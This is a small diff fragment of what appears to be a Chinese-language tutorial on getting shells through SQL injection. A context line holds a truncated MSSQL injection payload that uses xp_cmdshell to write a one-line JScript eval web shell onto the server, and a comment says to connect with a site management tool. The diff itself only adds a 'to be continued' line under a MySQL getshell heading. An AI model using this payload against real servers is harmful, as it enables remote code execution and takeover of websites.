@@ -37,3 +37,4 @@ id=1';exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Requ
 #然后网站管理工具链接.
 ```
 ## 篇2 基于mysql的getshell
+未完待续...
